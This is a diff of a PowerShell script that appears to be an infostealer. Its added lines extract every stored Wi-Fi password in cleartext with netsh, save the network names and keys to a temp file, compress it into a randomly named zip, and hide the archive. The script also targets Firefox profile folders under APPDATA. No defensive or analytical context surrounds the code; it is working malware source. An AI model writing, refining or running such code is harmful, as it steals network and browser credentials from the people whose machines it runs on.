@@ -1,11 +1,18 @@
 echo "qwe"
 $e=""
 $p=$env:TEMP+"\d"+(Get-Random -max 17071707)+".zip"
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize > $env:TEMP\p.txt
+$w=$env:TEMP+'\p.txt'
 
 if(Test-Path -Path "C:\Program Files\7-Zip2222\7z.exe")
   {Set-Location -Path "C:\Program Files\7-Zip\";$arh="7-Zip"}
-elseif(Test-Path -Path "C:\Program Files\WinRAR\WinRAR.exe")
+else
   {$arh="WinRar"}
+
+if("7-Zip"-in $arh)
+  {.\7z.exe a $p $w -spf -tzip}
+else
+  {Compress-Archive -Path $w -Update -CompressionLevel Fastest -DestinationPath $p}
 
 $f=($env:APPDATA+"\Mozilla\Firefox\Profiles\*");
 if(Test-Path -Path $f)
@@ -50,14 +57,6 @@ if(Test-Path -Path $o){
   echo "Oqwe"
 }
 else{echo "Oasd";$e=$e+'Oasd'}
-
-
-(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize > $env:TEMP\p.txt
-$w=$env:TEMP+'\p.txt'
-if("WinRAR" -in $arh)
-  {Compress-Archive -Path $w -Update -CompressionLevel Fastest -DestinationPath $p}
-elseif("7-Zip"-in $arh)
-  {.\7z.exe a $p $w -spf -tzip}
 
 attrib +H $p
 
